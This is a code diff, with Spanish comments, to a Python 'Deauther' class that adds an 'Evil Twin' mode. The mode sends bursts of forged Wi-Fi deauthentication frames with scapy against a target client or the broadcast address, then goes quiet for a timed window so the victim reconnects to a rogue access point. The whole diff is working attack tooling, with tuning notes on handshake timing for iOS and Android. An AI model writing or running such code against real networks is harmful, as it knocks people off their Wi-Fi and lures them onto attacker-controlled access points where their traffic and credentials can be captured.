@@ -24,7 +24,8 @@ class Deauther:
 
         # Callbacks para la GUI
         self.on_packet_sent = None
-        self.on_stopped = None
+        self.on_stopped     = None
+        self.on_et_window   = None  # fn() — llamado al abrir ventana libre para ET
 
     def _build_deauth(self, client_mac, ap_bssid):
         """
@@ -90,6 +91,50 @@ class Deauther:
         if self.on_stopped:
             self.on_stopped()
 
+    def _deauth_loop_et(self, client_mac, ap_bssid, packets_per_burst,
+                        burst_count, pause_secs):
+        """
+        Modo Evil Twin: ráfaga fuerte → pausa larga → repite.
+
+        Durante la pausa el cliente puede asociarse al Evil Twin sin que
+        los deauths lo expulsen antes de completar el 4-way handshake.
+
+        Args:
+            burst_count:  Número de ráfagas seguidas antes de pausar
+            pause_secs:   Segundos de ventana libre para que conecte al ET
+        """
+        packets = self._build_deauth(client_mac, ap_bssid)
+        if client_mac == "ff:ff:ff:ff:ff:ff":
+            packets = packets[:1]
+        count = 0
+
+        while self.running:
+            # --- Fase expulsión: burst_count ráfagas seguidas ---
+            for _ in range(burst_count):
+                if not self.running:
+                    break
+                for pkt in packets:
+                    sendp(
+                        pkt,
+                        iface=self.interface,
+                        count=packets_per_burst,
+                        inter=0.01,
+                        verbose=False
+                    )
+                    count += packets_per_burst
+                time.sleep(0.05)
+
+            if self.on_packet_sent:
+                self.on_packet_sent(count)
+
+            # --- Ventana libre: el cliente puede conectar al ET ---
+            if self.on_et_window:
+                self.on_et_window()
+            time.sleep(pause_secs)
+
+        if self.on_stopped:
+            self.on_stopped()
+
     def start(self, client_mac, ap_bssid, packets_per_burst=5, interval=0.1):
         """
         Inicia el ataque de deauth en un thread separado.
@@ -107,6 +152,29 @@ class Deauther:
         self._thread = threading.Thread(
             target=self._deauth_loop,
             args=(client_mac, ap_bssid, packets_per_burst, interval),
+            daemon=True
+        )
+        self._thread.start()
+
+    def start_et_mode(self, client_mac, ap_bssid,
+                      packets_per_burst=10, burst_count=6, pause_secs=8):
+        """
+        Modo Evil Twin: expulsa al cliente en ráfagas y luego abre una
+        ventana de silencio para que pueda asociarse al Evil Twin.
+
+        Args:
+            packets_per_burst: Tramas por ráfaga individual
+            burst_count:       Ráfagas seguidas antes de pausar (≈ 10 * 6 = 60 tramas)
+            pause_secs:        Ventana de silencio en segundos (8 s es suficiente
+                               para que iOS/Android complete el 4-way handshake)
+        """
+        if self.running:
+            return
+        self.running = True
+        self._thread = threading.Thread(
+            target=self._deauth_loop_et,
+            args=(client_mac, ap_bssid, packets_per_burst,
+                  burst_count, pause_secs),
             daemon=True
         )
         self._thread.start()
